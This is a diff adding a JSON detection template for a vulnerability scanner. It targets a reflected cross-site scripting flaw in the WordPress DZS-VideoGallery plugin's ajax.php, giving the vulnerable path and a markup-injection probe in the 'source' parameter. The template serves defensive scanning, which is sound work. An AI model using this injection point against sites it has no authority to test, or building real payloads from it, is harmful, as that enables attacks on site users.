@@ -1,0 +1,23 @@
+{
+    "target":"wordpress",
+    "meta":{
+        "name":    "WordPress DZS-VideoGallery XSS",
+        "remarks": "WordPress DZS-VideoGallery /ajax.php 存在反射型XSS漏洞",
+        "level":   3,
+        "type":    "XSS",
+        "author":   "wolf",
+        "references": {
+            "url":"",
+            "cve":"",
+            "kpid":"KP-0069"
+        }
+    },
+    "request":{
+        "path":     "/wp-content/plugins/dzs-videogallery/ajax.php?ajax=true&height=400&width=610&type=vimeo&source=\"/><test>test(666)</test>",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": "<test>test(666)</test>"
+    }
+}
